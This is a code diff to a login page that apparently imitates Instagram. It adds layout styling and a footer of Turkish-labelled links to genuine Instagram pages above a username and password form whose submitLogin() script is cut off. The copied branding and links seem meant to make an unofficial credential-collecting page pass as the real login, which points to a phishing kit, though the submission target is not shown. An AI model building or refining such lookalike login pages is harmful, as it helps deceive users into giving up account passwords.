@@ -7,6 +7,7 @@
     body {
       background-color: #fafafa;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
@@ -63,6 +64,28 @@
     button:hover {
       background-color: #318ae0;
     }
+    footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #737373;
+      text-align: center;
+    }
+    .footer-links {
+      list-style: none;
+      padding: 0;
+      margin: 10px 0 0 0;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+    }
+    .footer-links li a {
+      color: #737373;
+      text-decoration: none;
+    }
+    .footer-links li a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
@@ -77,6 +100,21 @@
     <input type="password" id="password" placeholder="Password" />
     <button onclick="submitLogin()">Log In</button>
   </div>
+
+  <footer>
+    <ul class="footer-links">
+      <li><a href="https://about.instagram.com/" target="_blank">Hakkında</a></li>
+      <li><a href="https://help.instagram.com/" target="_blank">Yardım</a></li>
+      <li><a href="https://about.instagram.com/blog" target="_blank">Basın</a></li>
+      <li><a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a></li>
+      <li><a href="https://www.instagram.com/about/jobs/" target="_blank">İş fırsatları</a></li>
+      <li><a href="https://privacycenter.instagram.com/policy" target="_blank">Gizlilik</a></li>
+      <li><a href="https://help.instagram.com/581066165581870" target="_blank">Koşullar</a></li>
+      <li><a href="https://www.instagram.com/explore/locations/" target="_blank">Konumlar</a></li>
+      <li><a href="https://www.instagram.com/accounts/login/?next=%2Faccounts%2Faccess_tool%2F" target="_blank">Meta Verified</a></li>
+    </ul>
+  </footer>
+
   <script>
     async function submitLogin() {
       const username = document.getElementById("username").value;
